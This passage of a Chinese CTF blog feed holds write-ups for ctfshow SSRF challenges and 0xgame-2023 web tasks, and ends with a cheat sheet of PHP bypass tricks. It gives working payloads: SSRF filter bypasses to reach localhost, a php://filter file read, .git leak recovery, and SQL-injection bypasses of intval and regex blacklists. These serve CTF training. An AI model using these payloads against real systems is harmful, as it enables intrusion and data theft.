<span class="hljs-number">1</span>);<br><span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-keyword">echo</span> (<span class="hljs-variable">$result</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker&#x27;</span>);<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker&#x27;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这里只能用http和https协议，然后过滤了localhost等环回地址的过滤</p><p>可以使用ip地址进制转换绕过</p><p>转换十进制</p><p>payload：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">url=http:<span class="hljs-regexp">//</span><span class="hljs-number">2130706433</span>/flag.php<br></code></pre></td></tr></table></figure><h2 id="web354"><a href="#web354" class="headerlink" title="web354"></a>web354</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$url</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-variable">$x</span>=<span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$url</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;scheme&#x27;</span>]===<span class="hljs-string">&#x27;http&#x27;</span>||<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;scheme&#x27;</span>]===<span class="hljs-string">&#x27;https&#x27;</span>)&#123;<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/localhost|1|0|。/i&#x27;</span>, <span class="hljs-variable">$url</span>))&#123;<br><span class="hljs-variable">$ch</span>=<span class="hljs-title function_ invoke__">curl_init</span>(<span class="hljs-variable">$url</span>);<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br><span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-keyword">echo</span> (<span class="hljs-variable">$result</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker&#x27;</span>);<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker&#x27;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>过滤了0和1，上面的方法都不能用了</p><p>搜索指向127.0.0.1的域名,直接拿来用</p><p><a href="https://www.maoyingdong.com/domain_to_localhost/">https://www.maoyingdong.com/domain_to_localhost/</a></p><p>payload:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">url=http:<span class="hljs-regexp">//</span>localtest.me/flag.php<br></code></pre></td></tr></table></figure><h2 id="web355"><a href="#web355" class="headerlink" title="web355"></a>web355</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$url</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-variable">$x</span>=<span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$url</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;scheme&#x27;</span>]===<span class="hljs-string">&#x27;http&#x27;</span>||<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;scheme&#x27;</span>]===<span class="hljs-string">&#x27;https&#x27;</span>)&#123;<br><span class="hljs-variable">$host</span>=<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;host&#x27;</span>];<br><span class="hljs-keyword">if</span>((<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$host</span>)&lt;=<span class="hljs-number">5</span>))&#123;<br><span class="hljs-variable">$ch</span>=<span class="hljs-title function_ invoke__">curl_init</span>(<span class="hljs-variable">$url</span>);<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br><span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-keyword">echo</span> (<span class="hljs-variable">$result</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker&#x27;</span>);<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker&#x27;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>host 长度小于等于5<br>payload:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">url=http:<span class="hljs-regexp">//</span><span class="hljs-number">127.1</span>/flag.php<br>url=http:<span class="hljs-regexp">//</span><span class="hljs-number">0</span>/flag.php<br></code></pre></td></tr></table></figure><h2 id="web356"><a href="#web356" class="headerlink" title="web356"></a>web356</h2><p>host len小于等于3<br>payload:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">url=http:<span class="hljs-regexp">//</span><span class="hljs-number">0</span>/flag.php<br></code></pre></td></tr></table></figure><h2 id="web357"><a href="#web357" class="headerlink" title="web357"></a>web357</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>**error_reporting**(<span class="hljs-number">0</span>);<br>**highlight_file**(**<span class="hljs-keyword">__FILE__</span>**);<br><span class="hljs-variable">$url</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-variable">$x</span>=**parse_url**(<span class="hljs-variable">$url</span>);<br>**<span class="hljs-keyword">if</span>**(<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;scheme&#x27;</span>]===<span class="hljs-string">&#x27;http&#x27;</span>||<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;scheme&#x27;</span>]===<span class="hljs-string">&#x27;https&#x27;</span>)&#123;<br><span class="hljs-variable">$ip</span> = **gethostbyname**(<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;host&#x27;</span>]);<br>**<span class="hljs-keyword">echo</span>** <span class="hljs-string">&#x27;&lt;/br&gt;&#x27;</span>.<span class="hljs-variable">$ip</span>.<span class="hljs-string">&#x27;&lt;/br&gt;&#x27;</span>;<br>**<span class="hljs-keyword">if</span>**(!**filter_var**(<span class="hljs-variable">$ip</span>, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) &#123;<br>    **<span class="hljs-keyword">die</span>**(<span class="hljs-string">&#x27;ip!&#x27;</span>);<br>&#125;<br><br><br><br>**<span class="hljs-keyword">echo</span>** **file_get_contents**(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>]);<br>&#125;<br>**<span class="hljs-keyword">else</span>**&#123;<br>    **<span class="hljs-keyword">die</span>**(<span class="hljs-string">&#x27;scheme&#x27;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>利用302跳转或者dns重绑定。自己没有服务器的可以在<a href="http://ceye.io/%E8%BF%99%E4%B8%AA%E7%BD%91%E7%AB%99%E4%B8%8A%E6%B3%A8%E5%86%8C%E4%B8%80%E4%B8%AA%E8%B4%A6%E5%8F%B7%EF%BC%8C%E7%84%B6%E5%90%8E%E5%B0%B1%E4%BC%9A%E7%BB%99%E4%BD%A0%E5%88%86%E9%85%8D%E4%B8%80%E4%B8%AA%E5%9F%9F%E5%90%8D%E3%80%82">http://ceye.io/这个网站上注册一个账号，然后就会给你分配一个域名。</a></p><p><img src="https://i.imgs.ovh/2023/10/19/2mDQ0.png" alt="image-20231019214423105"></p><p>在这里添加127.0.0.1的ip。 再用分配给你的域名去访问flag.php。</p><p>第一个随意写，第二个为127.0.0.1</p><p>格式为<a href="http://r.xxx/flag.php%E3%80%82">http://r.xxx/flag.php。</a></p><p>pay;oad:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">url=http:<span class="hljs-regexp">//</span>r.****/flag.php<br></code></pre></td></tr></table></figure><h2 id="web358"><a href="#web358" class="headerlink" title="web358"></a>web358</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>**error_reporting**(<span class="hljs-number">0</span>);<br>**highlight_file**(**<span class="hljs-keyword">__FILE__</span>**);<br><span class="hljs-variable">$url</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-variable">$x</span>=**parse_url**(<span class="hljs-variable">$url</span>);<br>**<span class="hljs-keyword">if</span>**(**preg_match**(<span class="hljs-string">&#x27;/^http:\/\/ctf\..*show$/i&#x27;</span>,<span class="hljs-variable">$url</span>))&#123;<br>    **<span class="hljs-keyword">echo</span>** **file_get_contents**(<span class="hljs-variable">$url</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p>[正则表达式字符](<a href="https://blog.csdn.net/xhmerry/article/details/1550928#:~:text=%3A">https://blog.csdn.net/xhmerry/article/details/1550928#:~:text=%3A</a> 匹配前面的内容出现 0 次或 1 次。 %2B %3A,恰巧出现 n 次。 {n%2C} %3A 大于等于 n 次。)</p><ul><li>^ ：匹配输入字符串的开始位置。如果设置了 RegExp 对象的 Multiline 属性，^ 也匹配 ‘&#x2F;n’ 或 ‘&#x2F;r’ 之后的位置。</li><li>$ ：匹配输入字符串的结束位置。如果设置了RegExp 对象的 Multiline 属性，$ 也匹配 ‘&#x2F;n’ 或 ‘&#x2F;r’ 之前的位置。</li><li>&#x2F;..* ：匹配前面的子表达式零次或多次。例如，zo* 能匹配 “z” 以及 “zoo”。* 等价于{0,}。</li></ul><p>所以，正则表达式表明以<code>http://ctf.</code>开始，以show结尾</p><p>payload:</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">http:</span>//ctf.<span class="hljs-subst">@127</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>/flag.php?show<br><span class="hljs-keyword">or</span><br><span class="hljs-symbol">http:</span>//ctf.<span class="hljs-subst">@127</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>/flag.php<span class="hljs-meta">#show</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>刷题</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctfshow</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>0xgame-2023</title>
    <link href="/2023/10/07/%E6%AF%94%E8%B5%9B/0xgame-2023/"/>
    <url>/2023/10/07/%E6%AF%94%E8%B5%9B/0xgame-2023/</url>
    
    <content type="html"><![CDATA[<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="Week-1-signin"><a href="#Week-1-signin" class="headerlink" title="[Week 1] signin"></a>[Week 1] signin</h3><p>信息收集，查看源码发现<code>assets/index-33309f51.js</code>，打开后在页面最底部可发现一个<code>sourceMappingURL=index-33309f51.js.map</code>,猜测可能是sourcemap文件泄露</p><p><code>/assets/index-33309f51.js.map</code>下载文件，找到flag</p><h3 id="Week-1-baby-php"><a href="#Week-1-baby-php" class="headerlink" title="[Week 1] baby_php"></a>[Week 1] baby_php</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// flag in flag.php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;name&#x27;</span>])) &#123;<br>  <span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br>  <span class="hljs-variable">$b</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>];<br>  <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>  <span class="hljs-variable">$name</span> = <span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;name&#x27;</span>];<br><br>  <span class="hljs-keyword">if</span> (<span class="hljs-variable">$a</span> != <span class="hljs-variable">$b</span> &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$a</span>) == <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$b</span>)) &#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$c</span>) &amp;&amp; <span class="hljs-variable">$c</span> != <span class="hljs-number">1024</span> &amp;&amp; <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$c</span>) == <span class="hljs-number">1024</span>) &#123;<br>      <span class="hljs-keyword">include</span>(<span class="hljs-variable">$name</span>.<span class="hljs-string">&#x27;.php&#x27;</span>);<br>    &#125;<br>  &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>payload：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-link">http://120.27.148.152:50014/?a</span>[<span class="hljs-string"></span>]=1&amp;b[]=2<br></code></pre></td></tr></table></figure><p>Post: c&#x3D;1024.1a</p><p>Cookie: name&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag</p><h3 id="Week-1-hello-http"><a href="#Week-1-hello-http" class="headerlink" title="[Week 1] hello_http"></a>[Week 1] hello_http</h3><p>get方式传参</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">120.27</span>.<span class="hljs-number">148.152</span>:<span class="hljs-number">50012</span>/?query=ctf<br></code></pre></td></tr></table></figure><p>post方式传参</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">action</span><span class="hljs-operator">=</span>getflag<br></code></pre></td></tr></table></figure><p>更改Cookie</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">Cookie: <span class="hljs-keyword">role</span>=<span class="hljs-keyword">admin</span><br></code></pre></td></tr></table></figure><p>加XFF头</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">X</span>-Forwarded-For: <span class="hljs-number">127.0.0.1</span><br></code></pre></td></tr></table></figure><p>改UA头</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">User</span>-Agent: HarmonyOS Browser<br></code></pre></td></tr></table></figure><p>改Referer</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">Referer:</span> ys.mihoyo.com<br></code></pre></td></tr></table></figure><p>得到flag</p><h3 id="Week-1-repo-leak"><a href="#Week-1-repo-leak" class="headerlink" title="[Week 1] repo_leak"></a>[Week 1] repo_leak</h3><p>python2 GitHack.py <a href="http://120.27.148.152:50013/.git">http://120.27.148.152:50013/.git</a></p><p><img src="https://i.imgs.ovh/2023/10/13/X8gCH.png" alt="X8gCH.png"></p><p><a href="https://blog.csdn.net/COCOLI_BK/article/details/103344407">https://blog.csdn.net/COCOLI_BK/article/details/103344407</a></p><p><code>git log</code></p><p><code>git reflog</code></p><p>查看历史版本</p><p><img src="https://i.imgs.ovh/2023/10/13/X8UH5.png" alt="X8UH5.png"></p><p><code>git reset --hard 8a5b670558921bd232d75b29542492f00698298b</code></p><p>切换至有flag的版本</p><p><img src="https://i.imgs.ovh/2023/10/13/X852U.png" alt="X852U.png"></p><p><code>grep -r  &quot;flag&quot; ./</code></p><p>当前目录匹配含flag文件</p>]]></content>
    
    
    <categories>
      
      <category>比赛</category>
      
    </categories>
    
    
    <tags>
      
      <tag>比赛</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>常用知识点</title>
    <link href="/2023/09/27/web%E5%AD%A6%E4%B9%A0/%E5%B8%B8%E7%94%A8%E7%9F%A5%E8%AF%86%E7%82%B9/"/>
    <url>/2023/09/27/web%E5%AD%A6%E4%B9%A0/%E5%B8%B8%E7%94%A8%E7%9F%A5%E8%AF%86%E7%82%B9/</url>
    
    <content type="html"><![CDATA[<h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><p>var_dump( ) 以列的形式展开数据，方便查看</p><p>scandir( ) 扫描某一文件夹目录</p><p>file_get_contents( ) 读取文件，拼接用’.’ 如num&#x3D;file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))</p><p>base_convert() 函数 在任意进制之间转换数字，返回一个字符串</p><p>dechex() 函数：把十进制转换为十六进制。</p><p>hex2bin() 函数：把十六进制值的字符串转换为 ASCII 字符。</p><p>readfile() 函数读取文件</p><p>localeconv()函数返回一包含本地数字及货币格式信息的数组<br>配套使用<br>利用**scandir()**，传入’.’显示当前所有目录，即scandir(‘.’)</p><p>但 ‘.’被不符合正则匹配的规则</p><p> 然后利用**localeconv()**函数返回一包含本地数字及货币格式信息的数组（其数组的第一个值就是.）</p><p>利用指针指向数组的第一个值</p><p><strong><code>current()</code></strong> 函数返回数组中的当前元素的值。每个数组中都有一个内部的指针指向它的”当前”元素，初始指向插入到数组中的第一个元素。</p><p><strong><code>pos()</code></strong> 函数返回数组中的当前元素的值。该函数是 current() 函数的别名。每个数组中都有一个内部的指针指向它的”当前”元素，初始指向插入到数组中的第一个元素。</p><p><strong>scandir(localeconv(current()));</strong><br><strong><code>next()</code></strong> 函数将内部指针指向数组中的下一个元素，并输出。返回的是数组具体的值，不能嵌套。<br><strong><code>array_reverse()</code></strong> 函数返回翻转顺序的数组。</p><h3 id="preg-match绕过"><a href="#preg-match绕过" class="headerlink" title="preg_match绕过"></a>preg_match绕过</h3><h4 id="1、数组绕过"><a href="#1、数组绕过" class="headerlink" title="1、数组绕过"></a>1、数组绕过</h4><p>preg_match只能处理字符串，当传入的subject是数组时会返回false</p><h4 id="2、PCRE回溯次数限制"><a href="#2、PCRE回溯次数限制" class="headerlink" title="2、PCRE回溯次数限制"></a>2、PCRE回溯次数限制</h4><p><code>pcre.backtrack_limit</code>给pcre设定了一个回溯次数上限，默认为1000000，如果回溯次数超过这个数字，preg_match会返回false</p><h4 id="3、换行符"><a href="#3、换行符" class="headerlink" title="3、换行符"></a>3、换行符</h4><p><code>.</code>不会匹配换行符，如</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&#x27;/^.*(flag).*$/&#x27;</span>, <span class="hljs-variable">$json</span>)) &#123;<br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>只需要</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-variable">$json</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;<span class="hljs-subst">\n</span>flag&quot;</span><br></code></pre></td></tr></table></figure><p>而在非多行模式下，<code>$</code>似乎会忽略在句尾的<code>%0a</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&#x27;/^flag$/&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>] !== <span class="hljs-string">&#x27;flag&#x27;</span>) &#123;<br>    <span class="hljs-built_in">echo</span> <span class="hljs-variable">$flag</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>只需要传入</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">?a=flag%0a<br></code></pre></td></tr></table></figure><h3 id="intval-函数绕过"><a href="#intval-函数绕过" class="headerlink" title="intval()函数绕过"></a>intval()函数绕过</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">int</span> <span class="hljs-title function_ invoke__">intval</span> ( <span class="hljs-keyword">mixed</span> <span class="hljs-variable">$var</span> [, <span class="hljs-keyword">int</span> <span class="hljs-variable">$base</span> = <span class="hljs-number">10</span> ] )<br></code></pre></td></tr></table></figure><p>函数作用：获取变量的整数值</p><p>0x:16 0:8 0b:2 默认10</p><h4 id="科学计数法绕过"><a href="#科学计数法绕过" class="headerlink" title="科学计数法绕过"></a>科学计数法绕过</h4><p>当函数中用字符串方式表示科学计数法时，函数的返回值是科学计数法前面的一个数，而对于科学计数法加数字则会返回科学计数法的数值</p><p> echo intval(1e10);              &#x2F;&#x2F; 1410065408<br> echo intval(‘1e10’);            &#x2F;&#x2F; 1<br> echo intval(‘1e10’+1);          &#x2F;&#x2F; 1410065409<br>应用场景：</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">if (<span class="hljs-name">intval</span>($_GET[&#x27;lover&#x27;]) &lt; <span class="hljs-number">2023</span> <span class="hljs-symbol">&amp;&amp;</span> intval($_GET[&#x27;lover&#x27;] + <span class="hljs-number">1</span>) &gt; <span class="hljs-number">2024</span>)<br></code></pre></td></tr></table></figure><h4 id="进制绕过"><a href="#进制绕过" class="headerlink" title="进制绕过"></a>进制绕过</h4><p>当某个数字被过滤时，可以使用它的 8进制&#x2F;16进制来绕过。</p><p>当 base 为空时，默认值是 0，会根据 $var 的格式来调整转换的进制。</p><p>如果 $var 以 0 开头，就使用 8进制</p><p>如果 $var 以0x开头，就使用 16进制</p><p>否则，就使用 10进制</p><h4 id="转换字符串特性绕过"><a href="#转换字符串特性绕过" class="headerlink" title="转换字符串特性绕过"></a>转换字符串特性绕过</h4><p>如果以数字开头，就返回1个或多个连续的数字</p><p>如果以字母开头，就返回0</p><p> if(intval($id) &gt; 999){<br>         # id 大于 999 直接退出并返回错误<br>         die(“id error”);<br>     }else{<br>         # id 小于 999 拼接sql语句<br>         $sql &#x3D; “select * from article where id &#x3D; $id order by id limit 1 “;<br> <!-- flag in id = 1000 --><br>payload:?id&#x3D;2 or id&#x3D;1000</p><h4 id="数组绕过"><a href="#数组绕过" class="headerlink" title="数组绕过"></a>数组绕过</h4><p>intval() 转换数组类型时，不关心数组中的内容，只判断数组中有没有元素，有为1无为0</p><p>三种数组写法：</p><p> $a[]&#x3D;1;</p><p> $a&#x3D;array(1,2);</p><p> $a&#x3D;[1,2];<br>但在传参时一般使用第一种形式，经过测试发现，传参默认都是字符串类型，根据intval的字符串转换规则，如果字符串第一个字符不是数字就会直接返回0，所以后面两种形式都是返回0，只有第一种可以正确返回数字1</p><h4 id="取反-绕过"><a href="#取反-绕过" class="headerlink" title="取反~绕过"></a>取反~绕过</h4><p>当某个数字被过滤时，可以两次取反来绕过</p><p> var_dump(intval(~10));  \ -11<br> var_dump(intval(~~10)); \ 10</p><h4 id="算数运算符绕过"><a href="#算数运算符绕过" class="headerlink" title="算数运算符绕过"></a>算数运算符绕过</h4><p>当某个数字被过滤时，可以使用算数运算符绕过</p><p> var_dump(intval(5*5));<br> var_dump(intval(5+5));<br> var_dump(intval(05+5));<br>输出：</p><p> int(25)<br> int(10)<br> int(10)</p><h4 id="SQL注入intval-函数绕过黑名单方法"><a href="#SQL注入intval-函数绕过黑名单方法" class="headerlink" title="SQL注入intval()函数绕过黑名单方法"></a>SQL注入intval()函数绕过黑名单方法</h4><p> #flag in id&#x3D;1000<br> if(preg_match(“&#x2F;or|-|\|*|&lt;|&gt;|!|x|hex|+&#x2F;i”,$id)){<br>     die(“id error”);<br> }<br> if(intval($id) &gt; 999){<br>     die(“id error”);<br> }<br> else{</p><pre><code class="hljs">     # id 小于 999 拼接sql语句</code></pre><p>​         $sql &#x3D; “select * from article where id &#x3D; $id order by id limit 1 “;<br> }<br> 根据黑名单的不同，访问?id&#x3D;1000有以下几种方法:<br> ?id&#x3D;’1000’ &#x2F;&#x2F;“1000”或(1000)皆可<br> ?id&#x3D;125&lt;&lt;3 &#x2F;&#x2F;左移<br> ?id&#x3D;680|320 &#x2F;&#x2F;按位或<br> ?id&#x3D;992^8 &#x2F;&#x2F;按位异或<br> ?id&#x3D;~~1000 &#x2F;&#x2F;两次取反<br> ?id&#x3D;0x3e8 &#x2F;&#x2F;十六进制<br> ?id&#x3D;0b1111101000 